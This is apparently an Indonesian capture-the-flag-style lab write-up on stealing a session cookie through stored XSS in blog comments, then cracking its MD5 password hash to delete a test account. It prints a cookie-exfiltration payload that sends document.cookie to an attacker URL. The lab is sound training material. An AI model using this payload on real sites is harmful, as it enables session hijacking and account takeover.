# LAB 2 Offline Password Cracking

## Brief:
###	Lab ini punya kerentanan Xss di komen dan cookienya menggunakan password user.
	
## Tujuan:
###	akses akun carlos dan hapus akunnya
<img width="1922" height="1046" alt="Brief" src="https://github.com/user-attachments/assets/507ccb54-42d1-478e-9ac9-5d11017919c2" />
	
## Analisa:
####	1. login dengan wiener:peter
<img width="1920" height="1080" alt="1 login" src="https://github.com/user-attachments/assets/8b18f5c4-abd4-4eca-8078-24e1265fa5fc" />
	
####	2. ketika sudah login ada parameter stay-logged-in
<img width="1920" height="1080" alt="2 cookie tipe" src="https://github.com/user-attachments/assets/c65bc77e-0807-4d40-b3eb-de38a6019219" />
	
####		itu adalah cookie persistantnya dengan format 

    base64(username:md5(password))
	
####	3. test xss di komen dengan payload <script>alert('1')</script> dan ternyata vulberable
 <img width="1920" height="1080" alt="3 komen xss" src="https://github.com/user-attachments/assets/fa5de029-693d-49e4-9d79-5d1a52cb3163" />

####	4. pergi ke exploit server dan copy url attacker
<img width="1922" height="1046" alt="4 url attacker" src="https://github.com/user-attachments/assets/f7f039b7-5355-4dec-a18a-7b9b5b5faf96" />

####	5. komen lagi dengan payload 

    <script>document.location='https://urlattacker.com/exploit/'+document.cookie</script>
    
<img width="1922" height="1046" alt="5" src="https://github.com/user-attachments/assets/1e68116e-8fb7-4054-ad03-eb233d0ae251" />

####	6. di exploit server pergi ke log dan disana ada paramater cookie carlos
<img width="1920" height="1080" alt="6" src="https://github.com/user-attachments/assets/bafa057e-0165-4b48-8eb1-628a39eccbc2" />

####	7. crack hashnya dan passwordnya onceupontime
<img width="1920" height="1080" alt="7" src="https://github.com/user-attachments/assets/d6b5bb49-afe5-4576-8701-eae1bd8e3d2c" />

####	8. login dan hapus akun carlos
<img width="1922" height="1046" alt="8" src="https://github.com/user-attachments/assets/e8dd5d5a-00e0-481b-9db3-0bdfb45bac2f" />
